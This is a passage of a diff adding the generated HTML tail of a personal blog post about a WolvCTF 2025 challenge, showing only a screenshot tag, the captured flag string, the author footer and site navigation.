+          src="/posts/wolvctf-2025-individual/Pasted_image_20250324180843_hu14542903196780981810.png"
+          srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324180843_hu10719543910862738314.png 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324180843_hu14542903196780981810.png 660w
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324180843.png 864w
+          
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324180843.png 864w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Flag:</p>
+<pre tabindex="0"><code>wctf{1_th0ught_1t_w4s_s3cur3?}
+</code></pre>
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+      
+      
+        
+        
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+      
+    >
+      
+      
+      
+      
+      <img
+        width="717"
+        height="717"
+        class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+        alt="dree"
+        loading="lazy" decoding="async"
+        
+          src="/img/author_hu2515200946889239367.jpg"
+          srcset="/img/author_hu5754712382128878614.jpg 330w,/img/author_hu2515200946889239367.jpg 660w
+          
+            ,/img/author.jpg 717w
+          
+          
+            ,/img/author.jpg 717w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+      
+    
+    <div class="place-self-center">
+      
+        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+          Author
+        </div>
+        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+          dree
+        </div>
+      
+      
+        <div class="text-sm text-neutral-700 dark:text-neutral-400">i hack things</div>
+      
+      <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="mailto:dree.31415@gmail.com"
+          target="_blank"
+          aria-label="Email"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://github.com/dreeSec"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/posts/umd-ctf-2023/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >UMD CTF 2023</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-05-04 00:00:00 &#43;0000 UTC">4 May 2023</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/posts/wolvctf-2025-active-series/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >WolvCTF 2025 Active Series</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-03-24 00:00:00 &#43;0000 UTC">24 March 2025</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+      </main>
+      
+        <div
+          class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12"
+          id="to-top"
+          hidden="true"
+        >
+          <a
+            href="#the-top"
+            class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+            aria-label="Scroll to top"
+            title="Scroll to top"
+          >
+            &uarr;
+          </a>
+        </div>
+      <footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2025
+            dree
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+        <div
+          class="me-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        >
+          <button id="appearance-switcher-0" type="button" aria-label="appearance switcher">
+            <div
+              class="flex h-12 w-12 items-center justify-center dark:hidden"
+              title="Switch to dark appearance"
+            >
+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+            </div>
+            <div
+              class="hidden h-12 w-12 items-center justify-center dark:flex"
+              title="Switch to light appearance"
+            >
+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+            </div>
+          </button>
+        </div>
+      
+    </div>
+  </div>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="http://localhost:1313/"
+>
+  <div
+    id="search-modal"
+    class="top-20 mx-auto flex min-h-0 w-full max-w-3xl flex-col rounded-md border border-neutral-200 bg-neutral shadow-lg dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex flex-none items-center justify-between px-2">
+      <form class="flex min-w-0 flex-auto items-center">
+        <div class="flex h-8 w-8 items-center justify-center text-neutral-400">
+          <span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="mx-1 flex h-12 flex-auto appearance-none bg-transparent focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex h-8 w-8 items-center justify-center text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto overflow-auto px-2">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+</html>
